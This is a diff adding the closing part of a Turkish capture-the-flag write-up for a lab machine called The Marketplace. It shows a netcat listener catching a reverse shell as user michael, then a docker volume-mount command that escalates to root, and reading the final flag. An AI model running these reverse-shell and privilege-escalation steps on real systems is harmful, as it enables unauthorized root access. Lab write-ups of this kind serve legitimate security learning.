@@ -266,5 +266,50 @@ jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
 ```
 melami㉿Melami> nc -lvnp 4444
 ```
-![nc](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/micheal%20shell.png)
+![nc](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/nc.png)
+
+Tekrar Ssh bağlantısına geri dönün.Kodu çalıştırmadan önce backup.tar dosyasını silin.
+```
+rm backup.tar
+sudo -u michael /opt/backups/backup.sh
+```
+Michael adına reverse shell alabildik
+
+![michael](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/micheal%20shell.png)
+
+```
+id
+```
+![id](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/michael_id.png)
+
+Michael docker için yetkilendirilmiş bir kullanıcı o zaman docker ile root kullanıcı olmaya çalışalım.(Yetki yükseltme saldırıları için hayat kurtaran site : [GFTOBins](https://gtfobins.github.io/#)
+
+Docker imaj listesi için:
+
+![docker](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/docker%20list.png)
+
+alpine üzerinden yetki yükseltebiliriz.
+
+![gftobins](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/gftobins-docker.png)
+
+```
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+![priv](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/priv_root.png)
+
+Artık rootuz ve son bayrak için : 
+
+```
+cd /root
+cat root.txt
+```
+
+##Bitiriş
+Bu benim ilk writeup denememdi,daha çok ayrıntı vermek isterdim ama yazı çok fazla uzadığı için derin konuları başka writeuplarda yazmayı planlıyorum.
+Umarım işinize yaramıştır.
+Eksik ve Hatalar için lütfen benle iletişme geçin.
+İyi günler sağlıcakla kalın.
+
+
 
